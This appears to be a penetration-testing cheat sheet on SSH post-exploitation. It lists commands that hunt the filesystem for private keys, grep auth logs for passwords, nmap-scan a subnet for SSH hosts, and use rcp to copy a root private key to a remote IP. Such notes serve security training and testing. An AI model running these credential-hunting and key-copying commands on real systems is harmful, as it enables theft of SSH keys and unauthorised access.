# SSH

### SSH File Hunting

{% code overflow="wrap" %}
```bash
#Find a PEM based Private key
find / -type f ! -path "/sys/*" ! -path "/proc/*"  -exec grep -l "PRIVATE KEY" {} \; 2>/dev/null

#check /.ssh directory permission
ls -al /.ssh/

#Typical file paths
user/.ssh/id_rsa
user/.ssh/authorized key
 
#Check if root ssh login is permitted
grep PermitRootLogin /etc/ssh/sshd_config

#Check if SSH accepts password / key based SSH
 
grep 'password' /var/log/secure
grep 'password' /var/log/auth.log
grep 'password' /var/log/auth.log | tail -n 10

#Find SSH hosts
nmap -p 22 --open -sV --script sshv1.nse 10.11.1.1-254 | grep "Nmap scan report" | cut -d" " -f5 > ssh_host_list.txt
 
#Copy the key and change permissions
 
rcp /.ssh/root_key root@192.168.142.153:/root/Downloads
chmod 600 root_key
 
#SSH Permission
 
chmod 700 ~/.ssh
chmod 644 ~/.ssh/authorized_keys
chmod 644 ~/.ssh/known_hosts
chmod 644 ~/.ssh/config
chmod 600 ~/.ssh/id_rsa
chmod 644 ~/.ssh/id_rsa.pub
```
{% endcode %}

&#x20;



&#x20;



&#x20;



&#x20;



&#x20;





&#x20;



&#x20;



&#x20;
